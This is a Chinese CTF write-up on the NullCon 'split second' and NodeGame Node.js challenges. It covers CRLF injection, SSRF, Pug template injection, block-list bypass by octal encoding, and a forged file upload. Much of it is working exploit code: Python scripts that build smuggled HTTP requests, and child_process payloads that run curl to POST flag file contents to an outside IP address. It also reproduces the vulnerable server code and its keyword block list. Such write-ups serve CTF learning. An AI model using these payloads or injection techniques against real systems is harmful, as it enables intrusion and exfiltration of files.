class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">adminauth: secretpassword</span><br><span class="line">pug: - code </span><br><span class="line">dummy:  HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>pug处可以执行我们需要执行的命令。而关键headers里的参数已经绕过。既然如此，可以大致写出我们需要用CRLF注入的命令payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SPACE+HTTP+%2F+1.1+CRLF+Host+%3A+SPACE+127.0.0.1+CRLF+CRLF+GET+SPACE+%2F+flag+SPACE+HTTP+%2F+1.1+CRLF+Host+%3A+SPACE+127.0.0.1+CRLF+adminauth+%3A+SPACE+secretpassword+CRLF+pug+%3A+SPACE+aaa+CRLF+dummy+%3A+SPACE</span><br></pre></td></tr></table></figure><p>而只需<code>/core?q=payload</code>就执行了SSRF+CRLF。</p><p>而为了bypass对pug的渲染问题，我们直接选择8进制绕过。因为它不像unicode或者16进制那样容易包含字母。所以使用八进制绕过。大概如下形式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[][<span class="string">"constructor"</span>]  有效</span><br><span class="line">[][<span class="string">"\143\157\156\163\164\162\165\143\164\157\162"</span>] 有效，可执行</span><br><span class="line">[][\<span class="number">42</span>\<span class="number">143</span>\<span class="number">157</span>\<span class="number">156</span>\<span class="number">163</span>\<span class="number">164</span>\<span class="number">162</span>\<span class="number">165</span>\<span class="number">143</span>\<span class="number">164</span>\<span class="number">157</span>\<span class="number">162</span>\<span class="number">42</span>] 无效，因为双引号被编码了</span><br></pre></td></tr></table></figure><p>这里参照dalao的exp<br><a href="https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md" target="_blank" rel="noopener">https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md</a></p><p>(用的是py2,所以用虚拟机跑的才有正解):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.utils <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toOct</span><span class="params">(str)</span>:</span></span><br><span class="line">r=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line"><span class="keyword">if</span> i&gt;=<span class="string">'a'</span><span class="keyword">and</span> i&lt;=<span class="string">'z'</span>:</span><br><span class="line">r+=<span class="string">'\\'</span>+oct(ord(i))[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r+=i</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="comment">#This next line could test in nodejs interpreter so that we can observe the similar behavior about how http treat on unicode(\u&#123;xxxx&#125; is js encode pattern)</span></span><br><span class="line"><span class="comment">#Buffer.from('http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test', 'latin1').toString()</span></span><br><span class="line"><span class="comment">#Unicode čĊ will convert to latin1 which will only pick up the right most byte</span></span><br><span class="line">SPACE=<span class="string">u'\u0120'</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">CRLF=<span class="string">u'\u010d\u010a'</span>.encode(<span class="string">'utf-8'</span>)  <span class="comment"># transfer from unicode to utf-8 (\uxxxx is unicode's pattern)</span></span><br><span class="line">SLASH=<span class="string">u'\u012f'</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">pug = toOct(<span class="string">'''-[]["constructor"]["constructor"]("console.log(this.process.mainModule.require('child_process').exec('curl 120.27.246.202:8888 -X POST -d $(cat fl*)'))")()'''</span>).replace(<span class="string">'"'</span>,<span class="string">'%22'</span>).replace(<span class="string">"'"</span>,<span class="string">"%27"</span>)<span class="comment">#' and " need to be double encoded</span></span><br><span class="line"><span class="keyword">print</span> quote(pug)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'sol'</span>+SPACE+<span class="string">'HTTP'</span>+SLASH+<span class="string">'1.1'</span>+CRLF*<span class="number">2</span>+<span class="string">'GET'</span>+SPACE+SLASH+<span class="string">'flag'</span>+SPACE+<span class="string">'HTTP'</span>+SLASH+<span class="string">'1.1'</span>+CRLF+<span class="string">'x-forwarded-for:'</span>+SPACE+<span class="string">'127.0.0.1'</span>+CRLF+<span class="string">'adminauth:'</span>+SPACE+<span class="string">'secretpassword'</span>+CRLF+<span class="string">'pug:'</span>+SPACE+pug+CRLF+<span class="string">'test:'</span>+SPACE</span><br><span class="line"></span><br><span class="line">res=requests.get(<span class="string">'http://120.27.246.202:8081/core?q='</span>+quote(payload))</span><br><span class="line"><span class="comment">#res=requests.get('http://web2.ctf.nullcon.net:8081/core?q='+requote_uri(payload))</span></span><br><span class="line"><span class="keyword">print</span> res.content</span><br></pre></td></tr></table></figure><p>脚本中注意一下几点：<br>1.单引号与双引号均需要编码两次来绕过黑名单。<br>2.payload执行时是用<code>- code</code>的形式执行的。这是pug的特性。还可以<code>#{}</code>但是被过滤了<br>同时还学到了javascript中等价的表达方式，比如所参考的dalao的payload中用到了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][<span class="string">'constructor'</span>][<span class="string">'constructor'</span>](<span class="string">'console.log(payload)'</span>)()</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].constructor.constructor(<span class="string">'alert(12345)'</span>)()</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.constructor(<span class="string">'alert(12345)'</span>)()</span><br></pre></td></tr></table></figure><p>相当于借用了数组的构造方法来调用命令。<br><img src="/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/flag.PNG" alt="flag"><br>奇怪的是我又没弹到shell。curl命令到是没啥问题</p><h1 id="NodeGame"><a href="#NodeGame" class="headerlink" title="NodeGame"></a>NodeGame</h1><p>出题人思路很简单，既然这个CRLF+ssrf漏洞可以构造headers,那构造文件上传也可以喽。所以就有了这个题目<br>先来看给的源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">'./dist'</span>&#125;).array(<span class="string">'file'</span>));</span><br><span class="line">app.use(morgan(<span class="string">'short'</span>));</span><br><span class="line">app.use(<span class="string">"/uploads"</span>,express.static(path.join(__dirname, <span class="string">'/uploads'</span>)))</span><br><span class="line">app.use(<span class="string">"/template"</span>,express.static(path.join(__dirname, <span class="string">'/template'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">''</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">"only admin's ip can use it"</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">'/uploads/'</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">"/"</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">"file type error"</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">'upload success'</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">'/template/source.txt'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/source?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;error occurs!&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Example app listening at http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>关于<code>/core</code>不用多说，跟上面一样，而关于<code>file_upload</code>则类似上面那题的<code>/flag</code>。这样一来我们需要寻找文件上传的执行点在哪。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>看到首页接受了一个action参数，会将我们上传到/template/目录下的文件pug渲染。并且返回值。这样的话我们思路大致就清晰了：<br>还是通过core进行ssrf并伪造文件上传的http包访问到/flag。之后直接首页文件包含触发渲染，就可以访问到内容。<br>由于这里直接构造头太麻烦，所以要先抓个现成的pug文件上传包伪造下，注意包里面的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: &#x2F;..&#x2F;template</span><br><span class="line">Content-Length:292</span><br><span class="line">Connection:keep-alive</span><br></pre></td></tr></table></figure><p>等参数不可随便乱改<br>这里借赵师傅脚本小改下：<a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6462.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''' HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=--------------------------191691572411478</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string">cache-control: no-cache</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Content-Length: 292</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------191691572411478</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="exp.pug"</span></span><br><span class="line"><span class="string">Content-Type: /../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">doctype html</span></span><br><span class="line"><span class="string">html</span></span><br><span class="line"><span class="string">  head</span></span><br><span class="line"><span class="string">    style</span></span><br><span class="line"><span class="string">      include ../../../../../../../flag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------919695033422425209299810--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /flag HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">x:'''</span></span><br><span class="line">payload = payload.replace(<span class="string">"\n"</span>, <span class="string">"\r\n"</span>)</span><br><span class="line">payload = <span class="string">''</span>.join(chr(int(<span class="string">'0xff'</span> + hex(ord(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line">print(payload)</span><br><span class="line">r = requests.get(<span class="string">'http://9901208f-146e-4356-bad4-2d95ad2b9060.node3.buuoj.cn/core?q='</span> + urllib.parse.quote(payload))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>也是常规的把构造好的request用字符绕过。当然我们上一道题的八进制等等其他绕过我觉得都可以，毕竟此处没限制url传参不含字母。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?action&#x3D;exp</span><br></pre></td></tr></table></figure><p>成功包含flag<br><img src="/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/flag1.PNG" alt="flag"><br>值得一提的是我想用curl等等时又失败了，我按出题人给的方法构造包里直接放命令，结果很无语：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;file_upload HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------12837266501973088788260782942</span><br><span class="line">Content-Length: 6279</span><br><span class="line">Origin: http:&#x2F;&#x2F;localhost:8081</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;localhost:8081&#x2F;?action&#x3D;upload</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------12837266501973088788260782942</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;byc403.pug&quot;</span><br><span class="line">Content-Type: ..&#x2F;template</span><br><span class="line"></span><br><span class="line">- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http:&#x2F;&#x2F;120.27.246.202:8877 -X POST -d $(cat &#x2F;flag.txt)&#39;)</span><br><span class="line"></span><br><span class="line">-----------------------------12837266501973088788260782942--</span><br></pre></td></tr></table></figure><p><img src="/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/1.PNG" alt="error"><br>提示不能 Couldn’t connect to server.<br>然而出题人的exp里就是用的execSync+curl。我不知道什么情况。毕竟公益赛两道node题都已经证实不能<code>curl,wget,nc,bash</code>等等反弹shell或者连外网的操作。感觉很迷。那只能按赵师傅那样include了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF-phar-matches-everything填坑</title>
      <link href="2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/"/>
      <url>2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>之前校赛web最难的一道题……当时水平菜的看都不敢看，现在按师傅要求来做做这道题。(zjy师傅说这题把php相关知识几乎全考了，看来是很集大成的一道题目。)</p><p>题目首先进去后有两个功能，一个是仅限制图片的文件上传点。另一个是用<code>getimagesize()</code>搭配的读取图片文件信息的功能</p><p>首先是源码泄露。在catchmachine.php存在<code>.swp</code>泄露。然而buuoj上题目并没有泄露，直接看源码好了</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">        $ch = curl_init();  </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">'careful'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">'1'</span>)&#123;</span><br><span class="line">            <span 